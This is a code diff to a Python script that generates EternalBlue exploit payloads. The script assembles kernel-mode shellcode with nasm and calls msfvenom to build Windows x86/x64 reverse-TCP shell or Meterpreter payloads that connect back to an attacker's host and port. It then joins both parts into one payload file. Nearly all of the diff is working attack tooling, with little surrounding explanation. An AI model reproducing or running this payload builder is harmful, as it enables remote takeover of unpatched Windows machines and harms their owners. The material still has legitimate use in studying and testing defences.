@@ -23,13 +23,19 @@ parser.add_argument("-a","--arch", help="Target architecture (Default = x86)",
 args = parser.parse_args()
 # print(args)
 
-
+print("\n[*] Assembling kernel space shellcode binary\n")
+subprocess.call("nasm -f bin eternalblue_kshellcode_x86.asm", shell=True)
+subprocess.call("nasm -f bin eternalblue_kshellcode_x64.asm", shell=True)
+print("\n[*] Invoking msfvenom to generate userspace shellcode binary\n")
 if args.arch == "x64":
-	x64_payloads = {"s":"windows/x64/shell/reverse_tcp","m":"windows/x64/meterpreter/reverse_tcp",
+	x64_payloads = {"s":"windows/x64/shell/reverse_tcp",
+				"m":"windows/x64/meterpreter/reverse_tcp",
 				"n":"windows/x64/shell_reverse_tcp"}
 	msfpayload = x64_payloads[args.payload]
-	genshellcode = "msfvenom -p " + msfpayload + " -f raw " + "-o userspacesc.tmp " \
-				+ "EXITFUNC=thread " + "lhost=" + args.lhost + " lport=" + args.lport
+	genshellcode = "msfvenom -p " + msfpayload + \
+				" -f raw " + "-o userspacesc.tmp " \
+				+ "EXITFUNC=thread " + "lhost=" + args.lhost \
+				+ " lport=" + args.lport
 	subprocess.call(genshellcode,shell=True)
 	subprocess.call("cat eternalblue_kshellcode_x64 userspacesc.tmp > " + args.outfile, shell=True)
 	subprocess.call("rm userspacesc.tmp",shell=True)
@@ -42,4 +48,4 @@ else:
 	subprocess.call(genshellcode,shell=True)
 	subprocess.call("cat eternalblue_kshellcode_x86 userspacesc.tmp > " + args.outfile, shell=True)
 	subprocess.call("rm userspacesc.tmp",shell=True)	
-print("\n[*] Generated " + msfpayload + " payload")
+print("\n[*] Generated " + msfpayload + " payload\n")
